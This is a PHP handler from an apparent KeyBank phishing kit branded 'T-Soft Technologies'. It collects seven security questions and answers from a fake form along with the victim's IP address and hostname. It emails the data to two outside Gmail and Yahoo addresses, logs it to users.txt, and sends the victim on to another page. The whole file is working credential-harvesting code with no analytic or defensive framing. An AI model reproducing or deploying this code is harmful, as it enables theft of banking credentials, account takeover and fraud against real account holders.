<?php
$ip = getenv("REMOTE_ADDR");
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$hostname = gethostbyaddr($ip);


$message  = "=+=+=+=+=+=+[Security Questions- KeyBank Result]+=+=+=+=+=+=+=\n";
$message .= "Security Question1: ".$_POST['q1']."\n";
$message .= "Security Answer1: ".$_POST['ans1']."\n";
$message .= "Security Question2: ".$_POST['q2']."\n";
$message .= "Security Answer2: ".$_POST['ans2']."\n";
$message .= "Security Question3: ".$_POST['q3']."\n";
$message .= "Security Answer3: ".$_POST['ans3']."\n";
$message .= "Security Question4: ".$_POST['q4']."\n";
$message .= "Security Answer4: ".$_POST['ans4']."\n";
$message .= "Security Question5: ".$_POST['q5']."\n";
$message .= "Security Answer5: ".$_POST['ans5']."\n";
$message .= "Personal Question6: ".$_POST['q6']."\n";
$message .= "Security Answer6: ".$_POST['ans6']."\n";
$message .= "Personal Question7: ".$_POST['q7']."\n";
$message .= "Security Answer7: ".$_POST['ans7']."\n";
$message .= "IP: ".$ip."\n";

$message .= "=+=+=+=+=+=+=+[ Ip & Hostname Info ]+=+=+=+=+=+=+\n";
$message .= "Client IP : ".$ip."\n";$message .= "HostName : ".$hostname."\n";
$message .= "=+=+=+=+=+=+=+ [  T-Soft Technologies  ]+=+=+=+=+=+=+=+\n";



$recipient = "homead01@gmail.com, homead01@yahoo.com";
$subject = "KeyBank INFO 2 BY T-Soft Technologies $ip";
$headers = "From: Admin<admin@tsoft.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Version: 2.1\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   
		   $fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);
		   
		   
		   
		   
		   header("Location: email.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>